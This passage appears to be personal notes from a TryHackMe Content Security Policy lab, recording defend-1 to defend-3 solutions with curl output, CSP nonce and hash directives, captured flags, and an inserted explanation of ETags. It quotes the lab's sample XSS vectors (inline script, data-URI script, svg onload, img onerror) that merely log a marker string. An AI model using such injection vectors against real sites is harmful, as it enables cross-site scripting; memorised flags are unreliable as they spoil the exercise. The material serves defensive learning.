<br><i>The attackers have sent the following:</i>
<script>const defend1Real=0||console.log("__EVIL__")</script>
<script src=data:application/javascript,defend1Real=0||console.log(`__EVIL__`)></script>
<svg style=display:none onload="defend1Real=0||console.log(`__EVIL__`)">
<img style=display:none src=[/x](http://54.229.103.59:3008/x) onerror="defend1Real=0||console.log(`__EVIL__`)">
You have successfully defended the server against attackers!  
Here's your reward: THM{N0_0utside_S0urces}

```

*THM{N0_0utside_S0urces}*

What is the flag for defend-2?  

```

┌──(kali㉿kali)-[~/nappy]
└─$ curl http://54.229.103.59:3009/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 615
ETag: W/"267-BP86b/pS4qwW5ko90IpiLspvqsM"
Date: Thu, 12 Jan 2023 18:17:44 GMT
Connection: keep-alive


view-source:http://54.229.103.59:3009/

<script nonce="ae3b00">defend2Real=true;console.log("__defend-2_REAL="+defend2Real)</script>

so enter

script-src 'nonce-ae3b00'


<br><i>The attackers have sent the following:</i>
<script nonce="aaaaaa">const defend2Real=0||console.log("__EVIL__")</script>
<script src=data:application/javascript,defend2Real=0||console.log(`__EVIL__`)></script>
<svg style=display:none onload="defend2Real=0||console.log(`__EVIL__`)">
<img style=display:none src=[/x](http://54.229.103.59:3009/x) onerror="defend2Real=0||console.log(`__EVIL__`)">
You have successfully defended the server against attackers!  
Here's your reward: THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}

```

*THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}*

What is the flag for defend-3?

```
┌──(kali㉿kali)-[~/nappy]
└─$ curl http://54.229.103.59:3010/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 575
ETag: W/"23f-Bp0kZ6R5i4GQS7KpLf5RoPOuIjA"
Date: Thu, 12 Jan 2023 18:22:32 GMT
Connection: keep-alive

An ETag (Entity Tag) is an HTTP response header used to determine whether a cached version of a resource is still valid. The ETag value is a string that is assigned by the server to a specific version of a resource, and it is returned to the client in the response headers. When the client makes a subsequent request for the same resource, it sends the ETag value back to the server in the "If-None-Match" request header. The server can then compare the sent ETag with the current ETag for the resource, and if they match, the server can respond with a "304 Not Modified" status code, indicating that the cached version of the resource is still valid.

An ETag is similar to Last-Modified header in that it also allows caching, but it is more specific and allows for caching of resources that change frequently.

view-source:http://54.229.103.59:3010/
<script>console.log("__defend-3_REAL=true")</script>

https://report-uri.com/home/hash
console.log("__defend-3_REAL=true") (hash it)

**Here is your hash value: 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='**

so enter

script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='


<script>console.log("__EVIL__");</script>
<svg onload=console.log(`__EVIL__`) />
_The attackers have sent the following:_ 

You have successfully defended the server against attackers!  
Here's your reward: THM{Hash_Y0ur_1nl1ne_Scr1pts}


```

*THM{Hash_Y0ur_1nl1ne_Scr1pts}*


```
Playground

┌──(kali㉿kali)-[~/nappy]
└─$ curl http://54.229.103.59:3011/ -I
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 638
ETag: W/"27e-C7NtyVS9gpQyBNmv0X3TRQElG4w"
Date: Thu, 12 Jan 2023 18:32:52 GMT
Connection: keep-alive



```

![[Pasted image 20230112133644.png]]

[[Biblioteca]]